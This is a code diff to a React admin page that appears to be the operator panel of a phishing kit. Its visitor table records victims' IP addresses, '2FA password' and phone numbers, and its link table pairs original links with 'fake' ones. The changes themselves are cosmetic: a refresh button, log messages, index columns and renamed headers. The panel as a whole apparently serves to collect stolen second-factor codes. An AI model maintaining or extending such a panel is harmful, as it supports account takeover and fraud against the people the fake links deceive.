@@ -25,23 +25,24 @@ const AdminPage: FC = () => {
     const [link, setLink] = useState<IAdminLink>({} as IAdminLink)
     const [info, setInfo] = useState<IAdminInfo>()
     const [visitors, setVisitors] = useState<IAdminVisitor[]>([])
-    const [loading, setLoading] = useState<boolean>(false)
 
     const loadInfo = async () => {
         const {data} = await AdminService.getInfo()
         setInfo(data.json)
     }
 
-    const loadVisitors = async () => {
+    const loadVisitors = async (manuallyFlag:boolean = false) => {
         const {data} = await VisitorService.getAll()
         setVisitors(data.json)
+        if(manuallyFlag) store.updateLog(200, `Received ${data.json.length} visitor(s)`)
     }
 
-    const loadConfig = async () => {
+    const loadConfig = async (manuallyFlag:boolean = false) => {
         await loadInfo()
         await loadVisitors()
         let {data} = await AdminService.getLinks()
         setLinks(data.json)
+        if(manuallyFlag) await store.updateLog(200, `Manually refetched config successfully [200]`)
     }
 
     const createLink = async (e: any) => {
@@ -105,20 +106,31 @@ const AdminPage: FC = () => {
                                     <h1>{info.successfullVisits}</h1>
                                 </div>
                             </div>
+                            <div className={m.ToolsBlock}>
+                                <button className="svg-btn" onClick={() => loadConfig(true)}>
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                                        <path fillRule="evenodd" d="M8 3a5 5 0 1 0 4.546 2.914.5.5 0 0 1 .908-.417A6 6 0 1 1 8 2z"/>
+                                        <path d="M8 4.466V.534a.25.25 0 0 1 .41-.192l2.36 1.966c.12.1.12.284 0 .384L8.41 4.658A.25.25 0 0 1 8 4.466"/>
+                                    </svg>
+                                </button>
+                            </div>
                             <div className={m.TableWrapper}>
                                 <table className={m.Table}>
                                     <tr>
-                                        <th>id</th>
-                                        <th>refer id</th>
-                                        <th>status</th>
-                                        <th>ip</th>
+                                        <th></th>
+                                        <th>Referer id</th>
+                                        <th>Id</th>
+                                        <th>Status</th>
+                                        <th>Stmstp</th>
+                                        <th>Dropped</th>
+                                        <th>Ip</th>
                                         <th>2FA password</th>
-                                        <th>phone</th>
+                                        <th>Phone</th>
                                         <th>Actions</th>
                                     </tr>
                                     {
                                         visitors && visitors.length ?
-                                        visitors.map(visitor => <AdminVisitor deleteCb={deleteVisitor} visitor={visitor} key={visitor.id}/>)
+                                        visitors.map((visitor: IAdminVisitor, index:number) => <AdminVisitor deleteCb={deleteVisitor} index={index} visitor={visitor} key={visitor.id}/>)
                                         :
                                         <div className={m.TableMessage}>
                                             <p>There are no visitors</p>
@@ -131,9 +143,9 @@ const AdminPage: FC = () => {
                         :
                         <div className={m.TabWrapper}>   
                             <div className={m.Block}>
-                                <h3 className={m.BlockTitle}>
-                                    <p>There are no links</p>
-                                </h3>
+                                <h2 className={m.BlockTitle}>
+                                    Create link
+                                </h2>
                                 <form className={m.Form} onSubmit={createLink}>
                                     <div className={m.Inputs}>
                                         <Input
@@ -164,7 +176,7 @@ const AdminPage: FC = () => {
                                             required
                                         />
                                     </div>
-                                    <button> Create Link </button>
+                                    <button> Save </button>
                                 </form>
                             </div>
                             <div className={m.Blocks}>
@@ -187,9 +199,18 @@ const AdminPage: FC = () => {
                                     <h1>{info.successfullVisits}</h1>
                                 </div>
                             </div>
+                            <div className={m.ToolsBlock}>
+                                <button className="svg-btn" onClick={() => loadConfig(true)}>
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                                        <path fillRule="evenodd" d="M8 3a5 5 0 1 0 4.546 2.914.5.5 0 0 1 .908-.417A6 6 0 1 1 8 2z"/>
+                                        <path d="M8 4.466V.534a.25.25 0 0 1 .41-.192l2.36 1.966c.12.1.12.284 0 .384L8.41 4.658A.25.25 0 0 1 8 4.466"/>
+                                    </svg>
+                                </button>
+                            </div>
                             <div className={m.TableWrapper}>
                                 <table className={m.Table}>
                                     <tr>
+                                        <th></th>
                                         <th>Original link</th>
                                         <th>Fake link</th>
                                         <th>Tag</th>
@@ -200,7 +221,7 @@ const AdminPage: FC = () => {
                                     </tr>
                                     {
                                         links && links.length ?
-                                        links.map((link: IAdminLink) => <AdminLink deleteCb={deleteLink} link={link} key={link.id}/>)
+                                        links.map((link: IAdminLink, index: number) => <AdminLink index={index} deleteCb={deleteLink} link={link} key={link.id}/>)
                                         :
                                         <div className={m.TableMessage}>
                                             <p>There are no links</p>
